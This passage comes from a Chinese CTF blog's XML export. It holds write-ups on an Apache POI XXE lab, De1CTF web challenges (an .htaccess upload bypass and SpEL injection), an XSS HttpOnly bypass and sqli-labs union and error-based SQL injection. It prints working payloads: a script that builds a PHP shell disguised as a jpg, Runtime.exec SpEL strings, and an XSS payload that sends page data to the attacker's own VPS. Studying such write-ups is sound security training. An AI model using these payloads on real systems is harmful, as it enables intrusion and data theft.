class="xml">]&gt;</span></span><br></pre></td></tr></table></figure><p>再将文件后缀改为xlsx文件</p><p>监控我们linux靶机的2333端口(记得进去&#x2F;var&#x2F;www&#x2F;html):<br></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>然后上传我们的xlsx文件就行了</p><p><img src="/8.jpg"></p><p>就可以看到靶机上的注入结果了<br><img src="/9.jpg"></p><h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><h2 id="CVE-2019-10795-undefsafe原型链污染最近在研究jsouyp搞爬虫-准备开发个阅读器自用-最后一题等我有时间在做好了-node这方面也不怎么熟-希望后面用vue开发完后能很快理解"><a href="#CVE-2019-10795-undefsafe原型链污染最近在研究jsouyp搞爬虫-准备开发个阅读器自用-最后一题等我有时间在做好了-node这方面也不怎么熟-希望后面用vue开发完后能很快理解" class="headerlink" title="CVE-2019-10795 undefsafe原型链污染最近在研究jsouyp搞爬虫,准备开发个阅读器自用&#x3D; &#x3D;,最后一题等我有时间在做好了,node这方面也不怎么熟,希望后面用vue开发完后能很快理解~~~"></a><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">CVE-2019-10795 undefsafe原型链污染</a><br>最近在研究jsouyp搞爬虫,准备开发个阅读器自用&#x3D; &#x3D;,最后一题等我有时间在做好了,node这方面也不怎么熟,希望后面用vue开发完后能很快理解~~~</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">PHP反序列化从初级到高级利用篇</a><br><a href="https://blog.csdn.net/dillanzhou/article/details/82876575" target="_blank" rel="noopener">proc&#x2F;self&#x2F;目录的意义</a><br><a href="https://blog.csdn.net/weixin_43784056/article/details/106099498?fps=1&locationNum=2" target="_blank" rel="noopener">网鼎杯-web</a><br><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">Apache POI XML外部实体（XML External Entity，XXE）攻击详解</a></p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
          <category> Apache POI 3.10注入XML外部实体访问外部实体资源或者读取任意文件。 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> WEB </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF(复现) web</title>
      <link href="/2020/05/09/De1CTF-%E5%A4%8D%E7%8E%B0-web/"/>
      <url>/2020/05/09/De1CTF-%E5%A4%8D%E7%8E%B0-web/</url>
      
        <content type="html"><![CDATA[<p>我是笨比，当时两题思路都对！一次没成功就跑出去玩了。。。不过复现学到了好多新知识哈哈哈哈。</p><a id="more"></a><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><p id="div-border-left-red">考点：CGI（我好像是用正常htaccess改后缀做的）PHP短标签</p><p><img src="/1.jpg" alt="upload"></p><h3 id="满足两个条件："><a href="#满足两个条件：" class="headerlink" title="满足两个条件："></a>满足两个条件：</h3><ul><li>首先不能包含【perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet】这些内容</li><li>然后还要MIME是image类型才行</li></ul><p>ph的限制的话用短标签来绕过。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">短标签记得在php.ini里面把short_open_tag=on</span><br><span class="line">我记得是默认开启的</span><br><span class="line">简单描述：</span><br><span class="line">    <span class="php"><span class="meta">&lt;?</span>= <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></span><br><span class="line">    等价于</span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line">    所以可以构造<span class="php"><span class="meta">&lt;?</span>=system(<span class="string">'cat /flag'</span>) 来得到flag</span></span><br><span class="line"><span class="php">    然后利用.htaccess文件把jpg文件解析成php文件</span></span><br><span class="line"><span class="php">    .htaccess里面的php利用`\`加换行符绕过。(<span class="string">'\'：连接当前行与下一行字符)</span></span></span><br><span class="line"><span class="php">    我的理解：斜杠应该是转义(以前没遇到过，如果我说错了希望能纠正我一下，下次就不会错了。。)</span></span><br></pre></td></tr></table></figure><p>生成两个文件的快捷脚本&#x3D; &#x3D;</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = b<span class="string">"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_php_file(filename, script):</span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.<span class="built_in">write</span>(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">    phpfile.<span class="built_in">write</span>(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_htacess():</span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.<span class="built_in">write</span>(SIZE_HEADER)</span><br><span class="line">    htaccess.<span class="built_in">write</span>(b<span class="string">'AddType application/x-httpd-php .jpg\n'</span>)   <span class="comment">##反斜杠和换行自己手动加吧。</span></span><br><span class="line"></span><br><span class="line">    htaccess.<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"shell.jpg"</span>, <span class="string">"&lt;?=system('cat /flag');"</span>)</span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p id="div-border-left-red">考点：spel注入(以前用过这个类，或者他已经被包含进去了。看了好多博文，自己手动试了下，终于知道了。。)</p>这题用的是spring boot的框架，应该算是我最熟悉的框架了。不过我是第一次知道Scanner还有BufferedReader,两个类不仅可以读字符还可以读文件。学到了！~<p>前端是VUE的通过前端计算发送的请求，找到springboot写的接口。<br><img src="/2.jpg" alt="springbootAPI"></p><p>那别的Payload会发现他过滤了Runtime,java.lang,getClass,T(,new等字符。(一旦满足过滤就返回Hacker!)<br><a href="https://blog.csdn.net/yiyiwudian/article/details/46522415" target="_blank" rel="noopener">可的类</a><br>收录下一个<a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">师傅</a>收集的常用payload：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">T(<span class="params">java</span>.<span class="params">lang</span>.Runtime)</span>.get<span class="constructor">Runtime()</span>.exec(<span class="string">"nslookup a.com"</span>)</span><br><span class="line"><span class="constructor">T(Thread)</span>.sleep(<span class="number">10000</span>)</span><br><span class="line">#this.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">lang</span>.Runtime')</span>.get<span class="constructor">Runtime()</span>.exec('nslookup a.com')</span><br><span class="line"><span class="keyword">new</span> java.lang.<span class="constructor">ProcessBuilder(&#123;'<span class="params">nslookup</span> <span class="params">a</span>.<span class="params">com</span>'&#125;)</span>.start<span class="literal">()</span></span><br></pre></td></tr></table></figure><h3 id="Scanner的payload"><a href="#Scanner的payload" class="headerlink" title="Scanner的payload"></a>Scanner的payload</h3><p>利用Scanner获取，file函数读取&#x2F;flag里面的内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">New java<span class="selector-class">.util</span>.Scanner(New java<span class="selector-class">.io</span>.File(<span class="string">"/flag"</span>)).next()</span><br><span class="line"><span class="function"><span class="title">next</span><span class="params">()</span></span>读到空格结束</span><br><span class="line"><span class="function"><span class="title">nextLine</span><span class="params">()</span></span>读到回车结束</span><br></pre></td></tr></table></figure><h3 id="BuffereReader的payload"><a href="#BuffereReader的payload" class="headerlink" title="BuffereReader的payload"></a>BuffereReader的payload</h3><p>利用BufferedReader获取FileReader读取&#x2F;flag里面的内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">New java<span class="selector-class">.io</span>.BufferedReader(New java<span class="selector-class">.io</span>.FileReader(<span class="string">"/flag"</span>)).readLine()</span><br><span class="line"><span class="function"><span class="title">read</span><span class="params">()</span></span>只读取一个字符</span><br><span class="line"><span class="function"><span class="title">readLine</span><span class="params">()</span></span>读取</span><br></pre></td></tr></table></figure><p>这题正好查阅了很多资料。以前上课走神，没理解的一些东西，正好弄懂了~~~<br><img src="/3.jpg" alt="BufferedReader和FileReader的关系图，不知道哪里盗过来的，看太多了。。"><br>还有个问题困扰在我心里，为什么BufferedReader不能搭配File用，但是Scanner可以。查了好多资料都没找到原因(难道是抽象类的原因么。)</p><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//Clear the uploads directory every hour</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">$sandbox = <span class="string">"uploads/"</span>. md5(<span class="string">"De1CTF2020"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">"submit"</span>])&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            $filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span></span><br><span class="line"><span class="php">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Not Allow!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;               <span class="comment">//过滤</span></span></span><br><span class="line"><span class="php">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span></span><br><span class="line"><span class="php">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span></span><br><span class="line"><span class="php">    $exts = trim(end($ext));</span></span><br><span class="line"><span class="php">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span></span><br><span class="line"><span class="php">        !in_array($exts, $BlackExts) &amp;&amp; </span></span><br><span class="line"><span class="php">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank" rel="noopener">MIME类型</a><br><a href="https://www.php.cn/php-weizijiaocheng-415762.html" target="_blank" rel="noopener">PHP短标签</a><br><a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">spel注入</a><br><a href="https://blog.csdn.net/wuxinliulei/article/details/10347729?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">关于BufferedReader 和FileReader</a><br><a href="https://blog.csdn.net/yiyiwudian/article/details/46522415" target="_blank" rel="noopener">Scanner读取与处理</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
          <category> 上传绕过 </category>
          
          <category> Sple注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> WEB </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS绕过HTTPonly</title>
      <link href="/2020/05/05/XSS%E7%BB%95%E8%BF%87HTTPonly/"/>
      <url>/2020/05/05/XSS%E7%BB%95%E8%BF%87HTTPonly/</url>
      
        <content type="html"><![CDATA[<p>最近整理的时候，突然想起来以前有一题XSS的题，设置了HTTPonly，当时没想到怎么绕过，后来看wp有些不懂，当时JS代码还不太熟（现在也菜~）。虽然环境和源码都以及不在了。不过还是记忆犹新的。</p><a id="more"></a><p>云复现一下~</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>正常XSS能成功，但是不能获取Cookie,所以必须绕过。查看同域名下其他页面，有没有带COOKIE的请求。</p><p><img src="/1.png"></p><p><img src="/2.png"></p><p>构造XHR(ajax是XMLHttpRequest对象)请求:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//是否能跨域</span></span></span><br><span class="line"><span class="actionscript">xmlhttp.withCredentials=<span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">if(xmlhttp.readyState==4)&#123;     </span><br><span class="line"><span class="actionscript">    location.href=<span class="string">'http://读取COOkie用的域名（自己的VPS）/?flag='</span>+xmlhttp.responseText.match(<span class="string">'flag\&#123;(.*?)\&#125;'</span>)[<span class="number">1</span>]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">        <span class="comment">//设置连接信息</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">//第二个参数表示请求的url地址，get方式请求的参数也在url中</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">//第三个参数表示采用异步还是同步方式交互，true表示异步</span></span></span><br><span class="line"><span class="actionscript">xmlhttp.open(<span class="string">'GET'</span>,<span class="string">'/index.php/treehole/view?id='</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//4.发送数据，开始和服务器端进行交互</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">//同步方式下，send这句话会在服务器段数据回来后才执行完</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">//异步方式下，send这句话会立即完成执行</span></span></span><br><span class="line"><span class="actionscript">xmlhttp.send(<span class="string">''</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xmlhttp.readyState变化：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: 请求未初始化</span><br><span class="line"><span class="number">1</span>: 服务器连接已建立</span><br><span class="line"><span class="number">2</span>: 请求已接收</span><br><span class="line"><span class="number">3</span>: 请求处理中</span><br><span class="line"><span class="number">4</span>: 请求已完成，且响应已就绪 xmlhttp.status==<span class="number">200</span></span><br></pre></td></tr></table></figure><p>构造XSS-Payload:</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">'/efefefe'</span> onerror="xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function()&#123;if(xmlhttp.readyState==4)&#123;location.href=<span class="string">'http://读取COOkie用的域名（自己的VPS）/?flag='</span> + xmlhttp.responseText.match(<span class="string">'flag\&#123;(.*?)\&#125;'</span>)[1]&#125;&#125;;xmlhttp.open(<span class="string">'GET'</span>,<span class="string">'/index.php/treehole/view?id='</span>,true);xmlhttp.send(<span class="string">''</span>);"/&gt;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019UNCTF" target="_blank" rel="noopener">UNCTF2019WP</a><br><a href="https://www.w3school.com.cn/ajax/ajax_xmlhttprequest_send.asp" target="_blank" rel="noopener">W3-XHR请求</a></p>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs(Page-1)</title>
      <link href="/2020/04/10/sqli-labs-Page-1/"/>
      <url>/2020/04/10/sqli-labs-Page-1/</url>
      
        <content type="html"><![CDATA[<p>注入的sql一直想写来着的。之前数据库课偷懒的我，留下了悔恨的眼泪。。。(后面看着太烦了就没听了)</p><a id="more"></a><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="order-by语句"><a href="#order-by语句" class="headerlink" title="order by语句"></a>order by语句</h3><p>order by(默认升序排列) 可以测试一下当前一共select了多少个字段<br><br><code>select * from user where username=&#39;1&#39; ORDER BY 3 -- +&#39;</code></p><h3 id="union-联合查询语句"><a href="#union-联合查询语句" class="headerlink" title="union 联合查询语句"></a>union 联合查询语句</h3><p><b>union前后的两个sql语句的选择列数要相同才可以。Union all与union 的区别是增加了去重的功能。</b>当id的数据在数据库中不存在时，（此时我们可以id&#x3D;-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返回了我们构造的union 的数据。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">'-1'</span> UNION select 1,version(),database() -- +</span><br></pre></td></tr></table></figure><p>查询版本号，数据库名<br><img src="/1.jpg"><br>数据库名,利用<code>information_schema.SCHEMATA</code>这个表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">'-1'</span> UNION select 1,group_concat(SCHEMA_NAME),4 <span class="keyword">FROM</span> information_schema.SCHEMATA -- +<span class="string">'</span></span><br></pre></td></tr></table></figure><p><img src="/2.jpg"><br>查表,利用<code>information_schema.TABLES</code>这个表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">'-1'</span> UNION select 1,group_concat(table_name),4 <span class="keyword">FROM</span> information_schema.`TABLES` WHERE <span class="attribute">TABLE_SCHEMA</span>=<span class="string">'ctftraining'</span> -- +<span class="string">'</span></span><br></pre></td></tr></table></figure><p><img src="/3.jpg"><br>报ctftraining数据库的flag表的字段名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">'-1'</span> UNION select 1,group_concat(column_name),4 <span class="keyword">FROM</span> information_schema.COLUMNS WHERE <span class="attribute">TABLE_SCHEMA</span>=<span class="string">'ctftraining'</span> <span class="keyword">AND</span> <span class="attribute">TABLE_NAME</span>=<span class="string">'flag'</span> -- +<span class="string">'</span></span><br></pre></td></tr></table></figure><p><img src="/4.jpg"><br>查找ctftraining数据库的flag表的flag字段的值</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">'-1'</span> UNION select 1,group_concat(flag),4 <span class="keyword">FROM</span> ctftraining.flag -- +<span class="string">'</span></span><br></pre></td></tr></table></figure><p><img src="/5.jpg"></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><code>1 &#39; -- +</code>发现报错了，应该是应该是单引号影响了闭合。题目又说整数型报错。<br>所以猜测语句为：<br></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>所以不需要闭合直接用lesss-1的payload就行了,以防万一注释掉后面的内容<br></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">'-1'</span> UNION select 1,group_concat(flag),4 <span class="keyword">FROM</span> ctftraining.flag -- +<span class="string">'</span></span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>简单注入了一下看报错</p><p id="div-border-left-green">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'union select 1,2,3 -- ') LIMIT 0,1' at line 1</p>猜测语句：<p><code>$sql=&quot;select * from users where id=(&#39;$id&#39;)&quot;;</code><br>所以只需要将括号闭合：<br></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">'-1'</span>) UNION select 1,group_concat(flag),4 <span class="keyword">FROM</span> ctftraining.flag -- +<span class="string">'</span></span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>单引号闭合之后发现没有东西，然后尝试双引号闭合，发现报错：</p><p id="div-border-left-green">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'union select 1,version(),database() -- ") LIMIT 0,1' at line 1</p>应该是双引号加括号，猜测语句：<p><code>$sql=&quot;select * from users where id=(&quot;$id&quot;)&quot;;</code><br>所以将<code>“</code>和<code>)</code>闭合。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">"-1"</span>) union select 1,group_concat(flag),4 <span class="keyword">FROM</span> ctftraining.flag -- +<span class="string">'</span></span><br></pre></td></tr></table></figure><h2 id="less-5-无回显报错注入"><a href="#less-5-无回显报错注入" class="headerlink" title="less-5(无回显报错注入)"></a>less-5(无回显报错注入)</h2><p><b>看到有一种盲注解法，不过我感觉后面应该能碰到就不学这个先</b><br>随便注入一下，发现除了报错输出的都是<code>YOU are in........</code><br>怀疑是无回显，学习了<a href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener">详细讲解双查询注入</a>,懂了一些才敢往下写&#x3D; &#x3D;。</p><h3 id="Mysql报错注入原理分析-count-、rand-、group-by"><a href="#Mysql报错注入原理分析-count-、rand-、group-by" class="headerlink" title="Mysql报错注入原理分析(count()、rand()、group by)"></a>Mysql报错注入原理分析(count()、rand()、group by)</h3><p><a href="https://www.2cto.com/article/201604/498394.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a><br>参考这篇文章。</p><p id="div-border-left-red">当count()、和rand、以及group by三者同时使用，产生报错。<br>当rand()为空值时，概率报错。(必要条件：两条数据以上)<br>而当rand(0)时，必定报错(必要条件：三条数据以上)<br></p><b>对比的是最终的查询表，而不是一开始的。后面会说！</b><p><img src="/6.jpg" alt="用的rand()没报错(概率报错)"></p><p>利用回显的报错，来爆出数据库以及表：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user</span><br><span class="line"> where id= <span class="string">'-1'</span>union select 1,2,3 <span class="keyword">from</span> (select count(*),concat((select concat(schema_name)</span><br><span class="line">  <span class="keyword">from</span> information_schema.schemata limit 0,1),floor(rand()<span class="number">*2</span>)) as x </span><br><span class="line">  <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by x)as a -- +</span><br></pre></td></tr></table></figure><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">rand</span><span class="params">()</span></span>~~~随机一个<span class="number">0</span>-<span class="number">1</span>的小数</span><br><span class="line"><span class="function"><span class="title">floor</span><span 